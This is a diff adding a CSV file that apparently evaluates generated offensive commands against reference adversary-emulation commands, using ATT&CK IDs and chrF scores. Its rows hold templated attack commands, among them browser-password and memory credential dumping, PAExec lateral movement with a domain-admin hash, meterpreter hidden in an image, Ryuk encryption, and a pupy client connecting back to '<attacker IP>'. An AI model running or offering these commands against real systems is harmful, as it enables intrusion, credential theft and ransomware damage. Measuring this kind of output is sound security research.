@@ -1,0 +1,36 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_adfind_TA0007_T1082.txt,adfind,"adfind -b <domain_name> -f ""(|(msDS-Site-Affinity=*)(msPKIRoamingTimeStamp=*))"" -r",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,13.727,True
+command_adfind_TA0007_T1082.txt,adfind,"adfind -b <domain_name> -f ""(&(objectCategory=Computer)(operatingSystem=*))"" -r",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,32.495,True
+command_adfind_TA0007_T1082.txt,adfind,"adfind -b <domain_name> -f ""(&(objectClass=msDS-Computer))"" -r",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,29.001,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",59.855,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -p > output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",46.422,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords url \n username \n password,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",39.431,True
+command_invoke_psimage_TA0011_T1105.txt,invoke psimage,Import-Module .\Invoke-PSImage.ps1,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,42.03,True
+command_invoke_psimage_TA0011_T1105.txt,invoke psimage,Invoke-PSImage -Script <obfuscated_powershell_script.ps1> -Out <griffon_payload.png> -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,32.85,True
+command_invoke_psimage_TA0011_T1105.txt,invoke psimage,Invoke-PSImage -Script <xor_encrypted_meterpreter_shellcode.asm> -Out <meterpreter_payload.png> -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,35.133,True
+command_invoke_psimage_TA0011_T1105.txt,invoke psimage,Invoke-PSImage -Script .\GRIFFON_Implant_Installer.ps1 -Out <installer_payload.png> -Image <existing_image.jpg> -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,36.142,True
+command_paexec_TA0007_T1016.txt,paexec,PAExec \\* -s ipconfig /all," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",9.206,True
+command_paexec_TA0007_T1016.txt,paexec,PAExec @computers.txt -u <domain_admin> -p <password> -i -c ipconfig /all," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",38.387,True
+command_paexec_TA0007_T1016.txt,paexec,"PAExec \\* -s net group ""Domain Admins"" /domain"," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",20.788,True
+command_pupy_TA0001_T1078.txt,pupy,run Lazagne,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",6.349,True
+command_pupy_TA0001_T1078.txt,pupy,run creddump,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",7.801,True
+command_pupy_TA0001_T1078.txt,pupy,run hashmon /path/to/process/memory,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",13.026,True
+command_pupy_TA0001_T1078.txt,pupy,run loot_memory browser_process_id,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",13.502,True
+command_pupy_TA0003_T1078.txt,pupy,run Lazagne,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",6.349,True
+command_pupy_TA0003_T1078.txt,pupy,run creddump,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",7.801,True
+command_pupy_TA0003_T1078.txt,pupy,run hashmon /path/to/process/memory,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",13.026,True
+command_pupy_TA0003_T1078.txt,pupy,run loot_memory,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",11.863,True
+command_pupy_TA0003_T1078.txt,pupy,run Lazagne && run creddump && run hashmon /path/to/process/memory && run loot_memory,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",12.202,True
+command_pupy_TA0004_T1078.txt,pupy,lazagne windows,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,22.745,True
+command_pupy_TA0004_T1078.txt,pupy,creddump linux,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",8.58,True
+command_pupy_TA0004_T1078.txt,pupy,hashmon /path/to/memory/directory,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",12.048,True
+command_pupy_TA0004_T1078.txt,pupy,loot_memory --browser=browser_name,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",15.183,True
+command_pupy_TA0005_T1078.txt,pupy,run Lazagne,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",6.349,True
+command_ryuk_TA0003_T1547.txt,ryuk,"ryuk -e --process-name ""GRIFFON"" --drop-bat-files",`ryuk.exe --encrypt --process-name notepad.exe`,36.507,True
+command_ryuk_TA0004_T1547.txt,ryuk,ryuk.exe --process-name <process_name> -e,`ryuk.exe --encrypt --process-name notepad.exe`,54.851,True
+command_wmic_TA0002_T1047.txt,wmic,wmic csproduct get uuid,"`wmic /node:#{""POS system""} process call create #{""executable""}`",15.452,True
+command_wmic_TA0002_T1047.txt,wmic,wmic os get osarchitecture,"`wmic /node:#{""POS system""} process call create #{""executable""}`",16.369,True
+command_wmic_TA0002_T1047.txt,wmic,wmic cpu get processorid,"`wmic /node:#{""POS system""} process call create #{""executable""}`",27.231,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic diskdrive get model, size","`wmic /node:#{""POS system""} process call create #{""executable""}`",13.097,True
+command_wmic_TA0002_T1047.txt,wmic,wmic logicaldisk get volumeSerialNumber,"`wmic /node:#{""POS system""} process call create #{""executable""}`",14.177,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic process call create ""notepad.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`",51.612,True
